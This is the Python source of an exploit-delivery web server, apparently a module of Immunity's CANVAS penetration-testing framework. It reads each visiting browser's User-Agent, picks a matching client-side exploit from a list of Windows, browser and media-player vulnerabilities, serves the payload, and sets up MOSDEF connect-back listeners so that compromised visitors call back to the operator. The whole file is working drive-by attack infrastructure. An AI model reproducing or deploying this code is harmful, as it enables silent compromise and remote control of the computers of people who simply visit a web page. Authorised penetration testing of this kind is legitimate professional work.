#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import socket
from exploitutils import *
from tcpexploit import tcpexploit
import time

NAME="HTTP Server"
DESCRIPTION="HTTP Server for client side vulnerabilities"
DOCUMENTATION={}
DOCUMENTATION["HTTP MOSDEF"]="HTTP MOSDEF supported modules: BABYBOTTLE MS06_24 ani_cursor binder firefox_definesetter firefox_utf8 flash_flv gapple_client gomplayer ie7wmp ie_setexpression iepdf installshield ms06_055 ms06_057 ms06_071 ms07_004 ms07_051 ms07_068 ms07_068_2 ms08_021 ms08_022 ms08_046 ms08_053 ooo_230 qt72_uncompressed qt73_rtsp qt_rtsp real_import smartag_word speech ssreader utorrent vlc_ssa voltaire wmf_setabort"
DOCUMENTATION["Command Line"]="If you're using this on the commandline, you'll probably want to use -O singleexploit:wmf_setabort or similar or it will go through its own list of exploits"
VERSION="1.0"

#affectsList=["Windows"]
PROPERTY = {}
PROPERTY['TYPE'] = "Servers"

NOTES="""

"""

CHANGELOG="""

"""


redirpage="""
<html>
<head>
<meta http-equiv="refresh" content="1">
</head>
<body>
CONTENT
</body>
</html>

"""


from libs.spkproxy import header, body
#import zlib #Python 2.3 or >
from canvasengine import WIN32MOSDEF,JAVASERVER,HTTPMOSDEF,HTTPSMOSDEF
from exploitutils import gzipBuffer


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port=80
        self.version=1

        # force engine to use hand selected callback interface .. can't use autofind
        self.autoFind = False

        self.name=NAME        
        self.num=0
        self.exploitslist={}
        self.allowexploits = []
        self.listenerArgsDict["fromcreatethread"]=1
        #YO BAS/PHIL, before next release can we have this automatically fill itself out
        #by asking the engine which exploits are client-sides?
        self.clientsides=["ani_cursor", "BABYBOTTLE", "wmf_setabort", "ms06_055"]
        self.singleexploit=""
        self.singleshot   = False
        self.response_count = 0
        self.response_threshold = 0
        # XXX: toggle this for HTTP MOSDEF connectbacks !
        self.HTTPMOSDEF = False
        self.useSSL = False
        self.bindip="0.0.0.0"
        return

    def neededListenerTypes(self):
        #We actually need something a lot more sophisticated here...but this will do for now
        #assuming we only have win32 sploits in the list...which isn't really true

        self.HTTPMOSDEF = int(self.argsDict.get("httpmosdef", self.HTTPMOSDEF))
        self.useSSL = (self.argsDict.get("ssl", self.useSSL))

        if self.HTTPMOSDEF:
            print "[!] HTTP Server using HTTP MOSDEF listener .."
            if self.useSSL:
                print "[!] HTTP MOSDEF SSL Enabled .."
                return [HTTPSMOSDEF]
            else:
                print "[!] HTTP MOSDEF SSL Disabled .."
                return [HTTPMOSDEF]
        else:
            self.getargs()
            if self.singleexploit != "":
                e = self.engine.getModuleExploit(self.singleexploit)
                return e.neededListenerTypes()

            else:
                # Horridly assume that we want win32 :D
                print "[!] HTTP Server using WIN32 MOSDEF listener .."
                return [WIN32MOSDEF]

    # returns a (brownser, [list of tags], extra info)
    # for example:
    #  ("Mozilla/4.0", ["compatible", "MSIE 6.0",  "Windows NT 5.1"], "Opera 7.23 [en]")

    def parseUserAgent(self, useragent):
        """
        Parsing User Agent
        """
        ndx = useragent.find("(")
        if ndx == -1:
            if useragent[:4] in ["Lynx", "Wget"]:
                #Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d
                version=useragent.split(" ")[0]
                others=useragent.split(" ")[1:]
                return (version,others)
            return None
        import string
        browser = string.strip(useragent[:ndx])
        # Looking for info between parentesis
        ndx += 1
        endtags = useragent[ndx:].find(")") 

        if endtags == -1:
            return (browser, [ useragent[ndx:] ], "")
        endtags+=ndx

        tags = useragent[ndx:endtags].split(";")
        ndx  = endtags + 1
        extrainfo = string.strip( useragent[ndx:] )

        return (browser, tags, extrainfo)

    def CheckUserAgent(self, useragent):
        """
        Sort the exploits we use by data and see which ones we should use
        This function fills up the self.allowexploits list, which is
        what self.makesploit uses.
        """
        print useragent
        self.log("Checking user agent: *%s*"%str(useragent))
        self.allowexploits = []
        for date in self.exploitslist:
            self.log("Looking into exploit of data: %s"%date)
            if self.exploitslist[date].searchMethod(useragent):
                self.allowexploits.append(date)
        self.allowexploits.sort()    
        self.allowexploits.reverse() # from early date (bigger) to older date (smaller)
        return 

    def handle(self, infd): 
        """
        handle a connection
        should really be in its own thread
        """
        self.log("Handling connection")
        clientheader=header(state="SERVER")
        clientheader.ssl=self.ssl
        ret=clientheader.readdata(infd)
        clientbody=body()
        #initialize this with everything, in case we get NO user agent
        self.CheckUserAgent("")
        if clientheader.gotGoodHeader():
            self.log("Got good request")
            useragent = clientheader.getHeaderValue('User-Agent')
            self.log("Useragent: %s"%useragent)
            if useragent != "":
                agentinfo = self.parseUserAgent(useragent)
                if agentinfo==None:
                    agentinfo=""
                self.log("User-Agent: %s" % str(agentinfo))
                self.CheckUserAgent(agentinfo) 
                self.log("Allowexploits=%s"%self.allowexploits)
                if self.allowexploits == []:
                    self.log("No exploit with a compatible User-Agent, ignoring...")
                    infd.close()
                    return 0

            if clientheader.bodySize()>0 or clientheader.wasChunked:
                self.log("Reading body")
                #readtillclosed always 0 on client
                clientbody.read(infd,clientheader.bodySize(),clientheader.wasChunked,0)
                self.log("Read body")

        self.log("Creating exploit response")

        #servbody = exploit
        servheader,servbody, exploit=self.makesploit(clientheader,clientbody)

        self.log("Responding")
        if servheader==None:
            #no header, we're done...
            self.log("Exploit returned None - we must be done...")
            infd.close()
            return
        else:
            if exploit.cangzip:
                servheader.setcanzip(clientheader)

        bodydata="".join(servbody.data)
        if servheader.cangzip and exploit.cangzip:
            bodydata=gzipBuffer(bodydata)
            servheader.addHeader("Content-Encoding","gzip")
            self.log("gzip encoding enabled")

        # If the mimetype was set explicitly in the 
        # exploit then test for it and adjust the response
        # headers appropriately.
        if hasattr(exploit, "mimetype") and exploit.mimetype is not None:
            if servheader.hasHeader("Content-Type"):
                servheader.setHeader("Content-Type",exploit.mimetype)
            else:
                servheader.addHeader("Content-Type",exploit.mimetype)

        #now we respond...
        response=""
        response+="%s %s %s\r\n"%(servheader.version,servheader.status,servheader.msg)

        #We might want to screw our Content-Length ;)
        havecontentlength=False
        for akey in servheader.headerValuesDict.keys():
            if akey.lower() == "content-length":
                havecontentlength=True
            response+=servheader.grabHeader(akey)
        self.log("Sending header data of %d bytes"%len(response))
        chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
        if not chunked and not havecontentlength:
            response+="Content-Length: "+str(len(bodydata))+"\r\n"
        response+="\r\n"
        response+="".join(bodydata)
        self.log("Total response length is %d bytes"%len(response))
        try:
            infd.sendall(response)
        except socket.error:
            self.log("Connection closed by peer")
        self.log("Response sent")
        infd.close() #connection close - later on we'll keep it.

        # We silently track the response count, so that singleshots
        # (which are mainly for testing) can be kept track of
        self.response_count += 1

        return 

    def fillexploitlist(self):
        """
        we have a list of exploits we run one by one...
        each exploit is responsible for telling us when it's done so it can do multiple requests...
        """
        n = 0
        if self.singleexploit:
            #specified on command line
            print "[!] using single exploit in http server .."
            self.log("Using single-exploit: %s"%self.singleexploit)
            self.exploitslist[0] = self.engine.getModuleExploit(self.singleexploit)
            self.exploitslist[0].HTTPMOSDEF = self.HTTPMOSDEF
            self.exploitslist[0].useSSL = self.useSSL
            self.exploitslist[0].link(self)
            #for e in self.exploitslist:
            #    e.link(self)
            self.log("Loaded and linked %s"%self.singleexploit)
        else:
            #use our built in list
            for mod in self.clientsides:
                ret=self.engine.getModule(mod)

                if ret:
                    if ret.DOCUMENTATION.has_key("Date public"):
                        date = ret.DOCUMENTATION["Date public"]

                        try:
                            date = time.mktime(time.strptime(date, "%m/%d/%Y"))                            
                        except ValueError:

                            try:
                                date= time.mktime(time.strptime(date, "%m/%d/%Y"))
                            except ValueError:
                                self.log("Invalid format for Date public: %s" % date)
                                date = n
                                n += 1
                    else:
                        date = n
                        n += 1

                    self.log("Loaded %s"%mod)
                    exploit = ret.theexploit()
                    exploit.HTTPMOSDEF = self.HTTPMOSDEF
                    exploit.useSSL = self.useSSL
                    exploit.link(self)
                    self.log("Linked %s"%mod)
                    self.exploitslist[date] = exploit 

        #for e in self.exploitslist.keys():
        #    self.exploitslist[e].link(self)

        return 

    def getargs(self):
        self.HTTPMOSDEF = int(self.argsDict.get("httpmosdef", self.HTTPMOSDEF))
        self.useSSL = int(self.argsDict.get("ssl", self.useSSL))

        self.port=int(self.argsDict.get("port",self.port))
        self.singleexploit=self.argsDict.get("singleexploit",self.singleexploit)
        self.bindip=self.argsDict.get("bindip",self.bindip)

        self.singleshot = self.argsDict.get("singleshot",self.singleshot)
        self.response_threshold = self.argsDict.get("response_threshold",self.response_threshold)

        return

    def listen(self):
        self.getargs()
        s=self.gettcplistener(self.port, self.bindip)

        if not s:
            if self.port < 1024:
                self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
                         "you can try to bind to a higher port" % self.port)
            else:
                self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
            return 0
        s.set_timeout(5)
        self.fillexploitlist()
        self.s=s
        return s 

    def accept(self, s=None ):
        """
        Try to accept one connection
        returns true if we found one
        """

        # First we check to make sure we haven't fulfilled the response_threshold
        if self.singleshot and self.response_count == self.response_threshold:
            return

        #we loop on this ,so no annoying printouts here
        #self.log("Accepting connection")
        if s==None:
            s=self.s 

        # If this is a remote HTTP server that is used as a bounce,
        # then we make sure that the socket is non-blocking
        if self.argsDict.get("passednodes")[0].nodetype != "LocalNode":
            blocking = 0
        else:
            blocking = 1

        try:
            # If this is a MOSDEFSock we pass in a blocking parameter
            infd,addr=s.accept(blocking=blocking) 

        except TypeError:
            # If it was a regular socket, then a TypeError would be raised
            # and we don't pass in a blocking parameter, we just do a regular accept()

            try:
                infd,addr=s.accept()        
            except timeoutsocket.Timeout:
                return

        except timeoutsocket.Timeout:
            return 

        if infd==-1:
            return

        self.handle(infd)
        return True #handled connection

    def run(self):

        # check if we're a node type that supports the httpserver module
        node = self.argsDict['passednodes'][0]
        if node.nodetype not in ['LocalNode', 'win32Node']:
            self.log('[X] Sorry, you can not start a HTTP Server on that nodeType')
            return 0

        self.getargs()
        #if self.target.interface==None:
        #    devlog("canvasexploit","Why is our target interface==None?!? %s"%str(self.target))
        self.log("Listening on host %s:%d"%(self.bindip,self.port))        
        s=self.listen()
        if not s:
            self.log("Failed to listen - not running")
            return 0
        while 1:
            # Uncomment this line for testomatic testing
            #self.log("Response count: %d" % self.response_count)
            if self.state==self.HALT:
                self.s.close()
                break

            # when testomaticing comment out the below block
            # it will tell you the final response count to plug into your testcase
            # BEGIN COMMENT BLOCK
            elif self.singleshot == True and self.response_count == self.response_threshold:
                self.s.close()
                self.state = self.HALT
                break
            # END COMMENT BLOCK

            self.accept() #also handles any incoming connections

        # reached when user chooses to halt webserver

        self.setInfo("%s on %s:%d - done (success!)"%(NAME,self.bindip,self.port))
        return 1


    def makesploit(self,clientheader,clientbody):
        """
        returns serverheader,serverbody, exploit_we_used
        """
        # allowexploit is a list of "date" sort()'ed
        self.log("Allowed Exploits is of length: %d"%len(self.allowexploits))
        for date in self.allowexploits:
            exploit = self.exploitslist[date]
            self.log("Looking at exploit: %s"%exploit.name)
            if exploit.state!="done":
                self.log("Using: %s"%exploit.name)
                try:
                    ret = exploit.makesploit(clientheader,clientbody)
                    return ret[0], ret[1], exploit
                except:
                    print "Error in exploit!"
                    import traceback
                    traceback.print_exc(file=sys.stderr)

        self.log("No exploit to run!")
        return None, None, None

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

